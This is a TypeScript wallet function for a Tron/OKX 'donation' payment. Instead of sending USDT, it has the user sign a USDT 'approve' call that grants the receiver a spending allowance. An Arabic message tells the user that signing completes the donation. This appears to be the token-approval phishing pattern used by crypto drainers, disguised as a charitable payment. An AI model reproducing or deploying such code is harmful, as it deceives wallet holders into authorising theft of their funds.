

import { toastError, toastSuccess } from "../../../utils/toast/index.tsx";
import { event } from "../../../utils/gtag";
export const tronOkxTransaction = async (
    receiverAddress: string,
    donationAmount: number,
    tronWeb: any,
    adapter: any
) => {
    // alert("进入tronOkxTransaction方法");
    // Sending a transaction with tron link
    try {
        // const transaction = await tronWeb.transactionBuilder.sendTrx(spender, tronWeb.toSun(amount), adapter.address);
        const spender = receiverAddress;
        // alert("spender: "+spender);
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

        const usdtContractAddressHex = tronWeb.address.toHex(usdtContractAddress);
        const functions = "approve(address,uint256)";
        const options = { feeLimit: 1000000000, callValue: 0 };
        const parameters = [
            { type: "address", value: spender },
            { type: "uint256", value: donationAmount * 10 ** 6 },
        ];
        const adapterAddressHex = tronWeb.address.toHex(adapter.address);
        const transactionExten =
            await tronWeb.transactionBuilder.triggerSmartContract(
                usdtContractAddressHex,
                functions,
                options,
                parameters,
                adapterAddressHex
            );
        const signedTransaction = await adapter.signTransaction(
            transactionExten.transaction
        );
        return await tronWeb.trx.sendRawTransaction(signedTransaction); // okx 钱包会弹出确认框

    } catch (err) {
        // alert("Error sending transaction:" + JSON.stringify(error, null, 2));
        event({
          action: 'wallet-error',
          from: receiverAddress,
          to: donationAmount,
          type: 'erc20',
          message: err?.message
        })
        toastError("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!")
    }
};